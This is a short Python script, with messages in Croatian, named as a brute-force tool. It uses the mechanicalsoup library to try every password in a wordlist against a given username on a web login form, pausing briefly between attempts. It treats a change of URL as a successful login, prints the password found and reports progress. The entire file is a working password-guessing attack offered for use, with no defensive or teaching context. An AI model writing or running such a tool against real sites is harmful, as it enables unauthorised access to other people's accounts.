import mechanicalsoup
import sys
from datetime import datetime
import time
browser = mechanicalsoup.StatefulBrowser()

if len(sys.argv) != 4:
	print("Netočan broj argumenata. Primjer sintakse: python3 bruteforce.py <url> <lista zaporki> <korisničko ime>")
	
else:
	print("-" * 50)
	print("Vrijeme početka:" + str(datetime.now()))
	print("-" * 50)

url = sys.argv[1]
browser.open(url)

try: 

	passwords = open(sys.argv[2],"r",encoding='utf8') 	
	passwords_brojac = open(sys.argv[2],"r",encoding='utf8') 
	
	trenutna_linija = 0	
	brojac_liste = 0
	
	for x in passwords_brojac: 
		brojac_liste += 1
	 					

	for password in passwords:
	
		trenutna_linija += 1	
		
		password = password.strip()
		time.sleep(0.2)
		browser.select_form()
		browser["username"] = sys.argv[3]
		browser["password"] = password 
		browser.submit_selected()

		if browser.get_url() != url:
			print("Uspješno pronađena zaporka! Zaporka je:" + str(password))
			sys.exit()
		elif trenutna_linija % 10 == 0:					
			progress = int((1 - ((brojac_liste - trenutna_linija) / brojac_liste)) * 100) 						
			print("Trenutni napredak je " + str(progress) + "%") 
			
finally:
	passwords.close()



